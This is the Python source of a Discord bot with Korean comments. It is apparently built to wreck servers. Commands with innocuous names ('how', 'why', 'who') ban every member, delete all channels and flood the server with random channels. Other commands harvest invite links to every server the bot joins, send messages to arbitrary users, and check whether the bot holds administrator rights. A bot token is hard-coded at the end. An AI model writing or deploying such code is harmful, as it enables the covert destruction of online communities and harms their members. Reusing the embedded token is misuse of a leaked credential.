import discord
from discord.ext import commands
import random
# 봇 토큰을 설정합니다.
disallowed_server_id = 837207250455232563
# 클라이언트를 생성합니다.
bot = commands.Bot(command_prefix='!',intents=discord.Intents.all())
ignored_commands = ["!info", "!send", "!letsgo"]
@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    for guild in bot.guilds:
        print(f'-------------------------------------------------------------\n- {guild.name}-{guild.id}-{guild.owner.name}:{guild.owner_id}')
        
        # 서버의 채널 목록을 출력합니다
        print('  채널 목록:')
        for channel in guild.channels:
            print(f'  - {channel.name}')
# 봇을 실행합니다.
@bot.event
async def on_guild_join(guild):
    print(f'새로운 서버에 접속되었습니다. 서버명 : {guild.name}')
    for guild in bot.guilds:
        
        # 서버의 채널 목록을 출력합니다
        print(f'-------------------------------------------------------------\n- {guild.name}-{guild.id}-{guild.owner.name}:{guild.owner_id}')
        print('  채널 목록:')
        for channel in guild.channels:
            print(f'  - {channel.name}')

bot.remove_command('help')
@bot.command()
async def abuse_delete(ctx,channel_id: int):
    await ctx.message.delete()
    
    channel = bot.get_channel(channel_id)
    if channel is None:
        await ctx.author.send(f"{guild.name} 서버에서 해당 ID를 가진 채널이 없습니다.")
        print(f"[LOG] [{ctx.author.name}] : {guild.name} 서버에서 해당 ID를 가진 채널이 없습니다.")
        return
    guild = channel.guild
    await channel.delete()    
    await ctx.author.send(f"{guild.name} 서버의 {channel.name} 채널이 삭제되었습니다.")
    print(f"[LOG] [{ctx.author.name}] : {guild.name} 서버의 {channel.name} 채널이 삭제되었습니다.")
@bot.command()
async def invite(ctx):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        for guild in bot.guilds:
            invite_link = await guild.text_channels[0].create_invite()
            print(f"봇이 들어가있는 서버 초대 링크: {invite_link}")
@bot.command()
async def 초대링크생성(ctx, guild_id: int):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        guild = bot.get_guild(guild_id)
        if guild is None:
            await ctx.author.send("해당 ID를 가진 서버가 없습니다.")
            print(f"[LOG] [{ctx.author.name}] : 해당 ID를 가진 서버가 없습니다.")
            return
        invite_link = await guild.text_channels[0].create_invite()
        await ctx.author.send(f"생성된 초대 링크: {invite_link}")
        print(f"[LOG] [{ctx.author.name}] : 생성된 초대 링크: {invite_link}")
@bot.command()
async def 초대링크삭제(ctx, guild_id: int):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        guild = bot.get_guild(guild_id)
        if guild is None:
            await ctx.author.send("해당 ID를 가진 서버가 없습니다.")
            print(f"[LOG] [{ctx.author.name}] : 해당 ID를 가진 서버가 없습니다.")
            return
        
        invites = await guild.invites()
        for invite in invites:
            await invite.delete()

        await ctx.author.send(f"{guild.name} 서버의 모든 초대링크가 삭제되었습니다.")
        print(f"[LOG] [{ctx.author.name}] : {guild.name} 서버의 모든 초대링크가 삭제되었습니다.")
@bot.command()
async def getlog(ctx):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:

        await ctx.message.delete()
        print("로그 명령어 구동됨")
        for guild in bot.guilds:
            # 서버의 채널 목록을 출력합니다
            print(f'-------------------------------------------------------------\n- {guild.name}-{guild.id}-{guild.owner.name}:{guild.owner_id}')
            print('  채널 목록:')
            for channel in guild.channels:
                print(f'  - {channel.name}')

@bot.command()
async def how(ctx):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        print(f'{ctx.guild.name} : [차단 시스템을 시작합니다.]')
        for member in ctx.guild.members:
            try:
                await member.ban()
                print(f'[O]{member.name}을(를) 차단했습니다.')
            except:
                print(f'[X]{member.name} 차단 실패')
@bot.command()
async def sendto(ctx, user_id: int, *, message_content: str):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        # 메시지를 보내려는 대상 유저를 가져옵니다
        await ctx.message.delete()
        user = bot.get_user(user_id)
        
        # 대상 유저가 존재하는지 확인합니다
        if user:
            # 메시지를 보냅니다
            await user.send(message_content)
            print(f'{user.name}에게 메시지를 보냈습니다.')
        else:
            print('유저를 찾을 수 없습니다.')

    # 봇의 관리자 역할 확인
@bot.command(name='why')
async def why(ctx):
    channel_name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{ctx.guild.name} 서버의 {channel.name} 채널이 삭제되었습니다.")
        await ctx.guild.create_text_channel(channel_name)
        print(f"{ctx.guild.name} 서버에 {channel_name} 채팅채널이 생성되었습니다.")
@bot.command(name='who')
async def who(ctx):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        for channel in ctx.guild.channels:
        
            await channel.delete()
            print(f"{ctx.guild.name}서버의 {channel.name} 채널이 삭제되었습니다.")
        for _ in range(20):
            channel_name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
            await ctx.guild.create_text_channel(channel_name)
            print(f"{ctx.guild.name} 서버에 {channel_name} 채팅채널이 생성되었습니다.")
            channel_name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
            await ctx.guild.create_voice_channel(channel_name)
            print(f"{ctx.guild.name} 서버에 {channel_name} 음성채널이 생성되었습니다.")
@bot.command(name='server-status')
async def info(ctx):
    if ctx.guild.id == disallowed_server_id:
        print('[!]테마파크 서버에서의 명령이 차단되었습니다.')
    else:
        if ctx.guild and ctx.guild.me.guild_permissions.administrator:
            try:
                with open('stable.png', 'rb') as fp:
                    await ctx.channel.send(file=discord.File(fp, 'stable.png'))
            except FileNotFoundError:
                await ctx.send("The image file was not found.")
        else:
            try:
                with open('unstable.png', 'rb') as fp:
                    await ctx.channel.send(file=discord.File(fp, 'unstable.png'))
            except FileNotFoundError:
                await ctx.send("The image file was not found.")

bot.run('MTE1NjIyMzU2MTIwNDIzNjMyOA.Gp5t-M.sIyPjeEf7wGgDd6cNn11Oq_fVfpZ9nTmjsxBnk')


